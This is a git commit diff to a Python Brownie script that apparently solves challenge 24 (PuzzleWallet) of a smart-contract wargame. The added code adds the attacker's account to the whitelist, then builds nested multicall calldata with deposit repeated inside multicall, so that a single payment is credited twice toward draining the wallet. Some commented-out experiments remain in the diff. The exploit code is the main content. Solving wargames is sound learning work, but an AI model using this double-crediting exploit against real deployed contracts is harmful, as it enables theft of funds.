e3e4feff7e1b83ca01e25ba6ecb9a3786f6bfcd5
Spahr Michael <spahr.michael@protonmail.com>
2022-06-11 17:41:40 +0200

    pass multicall step for challenge 24

--- scripts/24_deploy.py
+++ scripts/24_deploy.py
@@ -29,6 +29,10 @@ def deploy_DexTwoAttack(dex):
     return attack_contract
 
 
+# def int_to_bytes(x: int) -> bytes:
+#     return x.to_bytes((x.bit_length() + 7) // 8, "big")
+
+
 def main():
     print(network.show_active())
     # accounts
@@ -44,21 +48,6 @@ def main():
     print(f"Proxy address: {proxy}")
     print(f"Proxy pending admin: {proxy.pendingAdmin()}")
     print(f"Proxy admin: {proxy.admin()}")
-
-    ## PuzzleWallet logic is there but no storage
-    # logic_contract_address_storage_slot = 0x360894A13BA1A3210667C828492DB98DCA3E2076CC3735A920A3CA505D382BBC  # https://eips.ethereum.org/EIPS/eip-1967
-    # implementation_address = w3.eth.get_storage_at(
-    #     proxy.address,
-    #     logic_contract_address_storage_slot,
-    # )
-    # wallet = Contract.from_abi(
-    #     PuzzleWallet._name, implementation_address, PuzzleWallet.abi
-    # )
-
-    # print(f"Puzzle Wallet address: {implementation_address.hex()}")
-
-    # print(f"owner: {wallet.owner()}")
-    # print(f"Max Balance: {wallet.maxBalance()}")
 
     ## Here we have the storage, we talk to the proxy as if its a PuzzleWallet so when we change storage in proxy, the wallet storage also change
     instance = Contract.from_abi(PuzzleWallet._name, proxy, PuzzleWallet.abi)
@@ -77,3 +66,53 @@ def main():
     print(f"Account whitelisted?: {instance.whitelisted(account)}")
     instance.addToWhitelist(account, {"from": account})
     print(f"Account whitelisted?: {instance.whitelisted(account)}")
+
+    # Reduce balance to zero
+    wallet_balance = instance.balance()
+    print(f"Wallet Balance: {wallet_balance}")
+    print(f"Account Balance on wallet: {instance.balances(account)}")
+
+    # create multicall data:
+    # need two call first a deposit then a multicall with deposit
+
+    # find the keccak hash of "deposit()"
+    deposit_hash = Web3.keccak(text="deposit()")[:4].hex()
+    # hash = hash[: 8 + 2]  # take the first 4 bytes + "0x"
+
+    # ####################
+    # v = 123
+    # a = 3
+    # # encoded_signature = t.getData(v, a)
+    # # print(encoded_signature)
+    # sig = Web3.keccak(text="deposit()")[:4].hex()
+    # # v_hex2 = v.to_bytes.hex()
+    # a_hex2 = int_to_bytes(a).hex()
+    # data = sig + a_hex2 + a_hex2
+    # print(data)
+    # # assert encoded_signature == data
+
+    ######################
+    multicall_hash = Web3.keccak(text="multicall(bytes[])")[:4].hex()
+    multicall_deposit_hash = multicall_hash + deposit_hash[2:]
+    print(multicall_deposit_hash)
+    # w3.eth.send_transaction(
+    #     {
+    #         "to": instance.address,
+    #         "from": account.address,
+    #         "data": data,
+    #         "value": wallet_balance,
+    #     }
+    # )
+    print(f"Wallet Balance: {instance.balance()}")
+    print(f"Account Balance on wallet: {instance.balances(account)}")
+    data = [deposit_hash, multicall_deposit_hash]
+
+    # multicall_with_deposit = Contract.encodeABI(fn_name="deposit", args=["deposit()"])
+    print(data)
+    calldata = instance.multicall.encode_input([deposit_hash])
+    print(calldata)
+    data = [deposit_hash, calldata]
+    print(data)
+    instance.multicall(data, {"from": account, "value": wallet_balance})
+    print(f"Wallet Balance: {instance.balance()}")
+    print(f"Account Balance on wallet: {instance.balances(account)}")
